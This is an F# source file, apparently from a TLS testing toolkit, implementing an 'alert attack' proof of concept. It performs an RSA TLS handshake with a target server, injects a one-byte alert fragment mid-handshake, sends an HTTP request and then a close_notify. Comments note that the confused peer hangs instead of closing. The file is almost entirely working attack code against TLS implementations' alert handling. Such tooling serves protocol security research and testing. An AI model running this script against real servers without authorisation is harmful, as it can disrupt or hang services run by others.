#light "off"

module AlertAttack

open FlexTypes
open FlexConnection
open FlexClientHello
open FlexServerHello
open FlexAlert
open FlexState
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexRecord
open FlexAppData
open FlexSecrets

open Bytes
open TLSInfo

let httpRequest host =
    sprintf "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\n\r\n" host

let alertAttack peer =
    // Connect to the server
    let st,_ = FlexConnection.clientOpenTcpConnection(peer,peer) in

    // Start a typical RSA handshake with the server
    let st,nsc,ch = FlexClientHello.send(st) in
    let st,nsc,sh = FlexServerHello.receive(st,nsc) in

    // *** Inject a one byte alert on behalf of the attacker ***
    let st = FlexAlert.send(st,Bytes.abytes [|1uy|]) in

    // Continue the typical RSA handshake
    let st,nsc,cert = FlexCertificate.receive(st,Client,nsc) in
    let st,shd      = FlexServerHelloDone.receive(st) in
    let st,nsc,cke  = FlexClientKeyExchange.sendRSA(st,nsc,ch) in
    let st,_        = FlexCCS.send(st) in
            
    // Start encrypting
    let st           = FlexState.installWriteKeys st nsc in
    let log          = ch.payload @| sh.payload @| cert.payload @| shd.payload @| cke.payload in
            
    let st,cf       = FlexFinished.send(st, logRoleNSC=(log,Client,nsc)) in
    let st,_        = FlexCCS.receive(st) in

    // Start decrypting
    let st          = FlexState.installReadKeys st nsc in
    // Check that verify_data is correct
    let vd = FlexSecrets.makeVerifyData nsc.si nsc.ms Server (log @| cf.payload) in
    let st,sf       = FlexFinished.receive(st) in
    if not (vd = sf.verify_data) then
        failwith "Verify_data check failed"
    else

    // RSA handshake is over. Send some plaintext
    let request = httpRequest peer in
    let st = FlexAppData.send(st,request) in
    printf "---> %s" request;
    let st,b = FlexAppData.receive(st) in
    let response = System.Text.Encoding.ASCII.GetString(cbytes b) in
    printf "<--- %s" response;

    // Close a connection by sending a close_notify alert
    let st = FlexAlert.send(st,TLSError.AD_close_notify) in

    (* *** Here we'd expect either a close_notify from the peer,
           or the connection to be shut down.
           However, the peer mis-interpreted our alert, and is now
           waiting for more data. *)
    printf "Sending close notify. Going to hang...\n";
    let st,ad = FlexAlert.receive(st) in
    printf "Alert: %A" ad;
    ignore (System.Console.ReadLine());
    ()